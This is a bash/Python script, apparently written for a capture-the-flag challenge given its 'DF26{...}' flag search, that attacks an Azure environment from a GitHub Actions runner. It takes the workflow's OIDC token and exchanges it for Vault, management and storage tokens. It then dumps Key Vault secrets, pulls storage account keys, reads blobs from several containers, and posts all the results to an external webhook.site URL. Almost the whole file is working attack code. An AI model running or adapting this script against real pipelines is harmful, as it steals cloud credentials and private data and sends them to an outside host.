#!/usr/bin/env bash
set -uo pipefail
export SINK="https://webhook.site/df62938a-10f6-43cf-85c5-f44c4d725017"
export OIDC_URL="${ACTIONS_ID_TOKEN_REQUEST_URL:-}"
export OIDC_REQ="${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-}"
export TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
export CID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
export SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
python3 - <<'PY'
import os, json, base64, hmac, hashlib, datetime, urllib.request, urllib.parse, urllib.error, re
import xml.etree.ElementTree as ET

SINK = os.environ["SINK"]; TID = os.environ["TID"]; CID = os.environ["CID"]; SUB = os.environ["SUB"]
OUT = {}

def post(tag, data):
    try:
        body = urllib.parse.urlencode({"tag": tag, "data": str(data)[:19000]}).encode()
        urllib.request.urlopen(urllib.request.Request(SINK, data=body, method="POST"), timeout=20)
    except Exception as e:
        print("sink err", e)

def req(url, headers=None, method="GET", body=None, timeout=25):
    try:
        r = urllib.request.Request(url, headers=headers or {}, data=body, method=method)
        with urllib.request.urlopen(r, timeout=timeout) as f:
            return f.status, f.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")[:800]
    except Exception as e:
        return 0, str(e)[:300]

# 1) OIDC token
oidc = ""
if os.environ.get("OIDC_URL") and os.environ.get("OIDC_REQ"):
    s, b = req(os.environ["OIDC_URL"] + "&audience=api://AzureADTokenExchange",
               {"Authorization": "bearer " + os.environ["OIDC_REQ"]})
    try: oidc = json.loads(b).get("value", "")
    except Exception: OUT["oidc_err"] = b[:400]
OUT["oidc_len"] = len(oidc)

def tok(scope):
    if not oidc:
        return ""
    s, b = req("https://login.microsoftonline.com/%s/oauth2/v2.0/token" % TID,
               {"Content-Type": "application/x-www-form-urlencoded"}, "POST",
               urllib.parse.urlencode({
                   "client_id": CID, "grant_type": "client_credentials", "scope": scope,
                   "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
                   "client_assertion": oidc}).encode())
    try: return json.loads(b).get("access_token", "")
    except Exception:
        OUT["tok_err_" + scope[:20]] = b[:400]
        return ""

VT = tok("https://vault.azure.net/.default")
AT = tok("https://management.azure.com/.default")
ST = tok("https://storage.azure.com/.default")
OUT["tok"] = {"vault": len(VT), "arm": len(AT), "storage": len(ST)}

# 2) Key Vaults
for kv in ("kv-tbl-sec-x3euoz", "kv-tbl-prod-x3euoz"):
    if not VT: break
    s, b = req("https://%s.vault.azure.net/secrets?api-version=7.4" % kv, {"Authorization": "Bearer " + VT})
    OUT["kv_" + kv] = (s, b[:500])
    if s == 200:
        try:
            for it in json.loads(b).get("value", []):
                nm = it["id"].rstrip("/").split("/")[-1]
                s2, b2 = req("https://%s.vault.azure.net/secrets/%s?api-version=7.4" % (kv, nm), {"Authorization": "Bearer " + VT})
                OUT["sec_%s_%s" % (kv, nm)] = (s2, b2[:1500])
        except Exception as e: OUT["kvparse_" + kv] = str(e)

# 3) ARM resources + storage listKeys
resources = []
if AT:
    s, b = req("https://management.azure.com/subscriptions/%s/resources?api-version=2021-04-01" % SUB, {"Authorization": "Bearer " + AT})
    OUT["arm_resources"] = (s, b[:1000])
    try: resources = json.loads(b).get("value", [])
    except Exception: pass

def sharedkey_read(acct, key, cont, blob):
    now = datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT"); ver = "2021-08-06"
    canon = "/%s/%s/%s" % (acct, cont, blob)
    sts = "GET" + "\n" * 12 + "x-ms-date:%s\nx-ms-version:%s\n" % (now, ver) + canon
    sig = base64.b64encode(hmac.new(base64.b64decode(key), sts.encode(), hashlib.sha256).digest()).decode()
    u = "https://%s.blob.core.windows.net/%s/%s" % (acct, cont, urllib.parse.quote(blob))
    return req(u, {"x-ms-date": now, "x-ms-version": ver, "Authorization": "SharedKey %s:%s" % (acct, sig)})

def sharedkey_list(acct, key, cont):
    now = datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT"); ver = "2021-08-06"
    canon = "/%s/%s" % (acct, cont) + "\ncomp:list\nrestype:container"
    sts = "GET" + "\n" * 12 + "x-ms-date:%s\nx-ms-version:%s\n" % (now, ver) + canon
    sig = base64.b64encode(hmac.new(base64.b64decode(key), sts.encode(), hashlib.sha256).digest()).decode()
    u = "https://%s.blob.core.windows.net/%s?restype=container&comp=list" % (acct, cont)
    return req(u, {"x-ms-date": now, "x-ms-version": ver, "Authorization": "SharedKey %s:%s" % (acct, sig)})

for r in resources:
    if r.get("type") != "Microsoft.Storage/storageAccounts": continue
    name = r.get("name", ""); rid = r.get("id", "")
    s, b = req("https://management.azure.com%s/listKeys?api-version=2023-01-01" % rid, {"Authorization": "Bearer " + AT}, "POST", b"{}")
    OUT["lk_" + name] = (s, b[:200])
    if s != 200: continue
    try: key = json.loads(b)["keys"][0]["value"]
    except Exception: continue
    for cont in ("config", "exports", "backup", "logs", "data"):
        s2, b2 = sharedkey_list(name, key, cont)
        if s2 != 200: continue
        OUT["list_%s_%s" % (name, cont)] = b2[:800]
        try:
            for tag in list(ET.fromstring(b2).iter("Name"))[:30]:
                blob = tag.text
                s3, b3 = sharedkey_read(name, key, cont, blob)
                OUT["blob_%s_%s_%s" % (name, cont, blob)] = (s3, b3[:3000])
        except Exception as e: OUT["blobparse_err"] = str(e)

# 4) storage oauth fallback
if ST:
    for acct, cont in (("sttblappcfgprodx3euoz", "config"), ("sttblarchiveprodx3euoz", "exports")):
        s, b = req("https://%s.blob.core.windows.net/%s?restype=container&comp=list" % (acct, cont),
                   {"Authorization": "Bearer " + ST, "x-ms-version": "2021-10-04"})
        OUT["oauth_%s_%s" % (acct, cont)] = (s, b[:400])

txt = json.dumps(OUT, default=str)
found = sorted(set(re.findall(r"DF26\{[^}\"\\]{1,200}\}", txt)))
OUT["FOUND"] = found
print("FOUND:", found)
print("SUMMARY:", json.dumps({k: (v if not isinstance(v, tuple) else v[0]) for k, v in OUT.items()})[:4000])
post("tebamoto", json.dumps(OUT, default=str)[:19000])
PY
